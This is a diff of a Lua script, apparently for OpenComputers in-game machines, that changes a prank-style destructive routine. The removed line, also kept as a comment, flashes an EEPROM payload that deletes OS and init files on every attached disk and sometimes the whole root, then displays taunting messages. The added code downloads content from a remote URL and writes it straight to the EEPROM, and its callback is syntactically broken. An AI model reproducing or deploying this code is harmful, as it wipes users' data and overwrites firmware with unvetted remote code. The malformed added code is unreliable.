@@ -35,7 +35,21 @@ local function GREETZ()
     "GREETZ: OCboy3, Chouladalls, Kurhox, SirKamilMarko";
   }
   
-  require("Component").eeprom.set("local a=component.proxy(component.list(\"gpu\")())local b,c,d,e,f,g,h=a.set,a.setBackground,a.setForeground,a.fill,a.copy,a.getBackground,a.getForeground;local i,j=a.getResolution()c(0x000000)d(0xFFFFFF)a.fill(1,1,i,j,\" \")local k=math.random(1,5)for l in component.list(\"filesystem\")do pcall(component.invoke(l,\"remove",\"/OS.lua\"))pcall(component.invoke(l,\"remove",\"/init.lua\"))if k==1 then pcall(component.invoke(l,\"remove",\"/\"))end end;local m={\"AS YOU REBOOT, YOU FIND THAT YOUR EEPROM HAS BEEN OVERWRITTEN!\",\"IT'S A SAD THING THAT YOUR ADVENTURES HAVE ENDED HERE!\",\" \",\"Direct all hate to Kizmo (@KizmoTek on Twitter)\",\" \",\"GREETZ:\", \"OCboy3, Chouladalls, Kurhox, SirKamilMarko\"}if k==1 then m[8]=\"Your disks have been WRECKED!\"end;for n,o in pairs(m)do b(2,n+1,o)end;while true do computer.pullSignal(1) end\") for index, thing in pairs(stuff_to_say) do set(3,index+1,thing) end while true do computer.pullSignal(0.25) end end")
+  local code = ""
+
+  internet.rawRequest(
+    "http://httpbin.org/user-agent",
+    nil,
+    nil,
+    function(chunk
+      -- Do something with downloaded chunk of data
+      code = code .. chunk
+    end,
+    8
+  )
+
+  --require("Component").eeprom.set("local a=component.proxy(component.list(\"gpu\")())local b,c,d,e,f,g,h=a.set,a.setBackground,a.setForeground,a.fill,a.copy,a.getBackground,a.getForeground;local i,j=a.getResolution()c(0x000000)d(0xFFFFFF)a.fill(1,1,i,j,\" \")local k=math.random(1,5)for l in component.list(\"filesystem\")do pcall(component.invoke(l,\"remove",\"/OS.lua\"))pcall(component.invoke(l,\"remove",\"/init.lua\"))if k==1 then pcall(component.invoke(l,\"remove",\"/\"))end end;local m={\"AS YOU REBOOT, YOU FIND THAT YOUR EEPROM HAS BEEN OVERWRITTEN!\",\"IT'S A SAD THING THAT YOUR ADVENTURES HAVE ENDED HERE!\",\" \",\"Direct all hate to Kizmo (@KizmoTek on Twitter)\",\" \",\"GREETZ:\", \"OCboy3, Chouladalls, Kurhox, SirKamilMarko\"}if k==1 then m[8]=\"Your disks have been WRECKED!\"end;for n,o in pairs(m)do b(2,n+1,o)end;while true do computer.pullSignal(1) end\") for index, thing in pairs(stuff_to_say) do set(3,index+1,thing) end while true do computer.pullSignal(0.25) end end")
+  require("Component").eeprom.set(code)
 
   while true do
      computer.pullSignal(0.25) 
